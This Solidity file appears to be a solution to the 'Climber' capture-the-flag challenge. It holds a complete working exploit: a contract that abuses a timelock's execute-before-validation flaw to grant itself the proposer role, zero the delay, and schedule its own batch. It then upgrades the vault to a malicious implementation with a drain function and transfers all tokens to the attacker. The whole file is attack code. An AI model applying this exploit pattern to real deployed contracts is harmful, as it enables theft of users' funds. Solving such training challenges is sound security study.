// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract HackedVault is ClimberVault {
    function drain(address _token, address _player) public {
        IERC20(_token).transfer(
            _player,
            IERC20(_token).balanceOf(address(this))
        );
    }
}

contract HackClimber {
    HackedVault hackedVault;
    ClimberTimelock lock;
    address tokenAddress;
    address vaultAddress;
    address playerAddress;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);
    bytes32 salt = 0x0;

    constructor(
        address payable _lock,
        address _token,
        address _vault,
        address _player
    ) {
        lock = ClimberTimelock(_lock);
        tokenAddress = _token;
        vaultAddress = _vault;
        playerAddress = _player;
        hackedVault = new HackedVault();
    }

    function hack() public {
        /* Call timelock with a set of function calls, which includes
         *   - Grant thisContract as the PROPOSER_ROLE
         *   - Update delay to 0
         *   - Upgrade the vaults' logic contract to HackedVault
         *   - Schedule this execution
         * Then, drain the vault
         */
        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );
        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector);
        targets[3] = vaultAddress;
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(hackedVault)
        );
        lock.execute(targets, values, dataElements, salt);

        HackedVault(vaultAddress).drain(tokenAddress, playerAddress);
    }

    function schedule() public {
        lock.schedule(targets, values, dataElements, salt);
    }
}
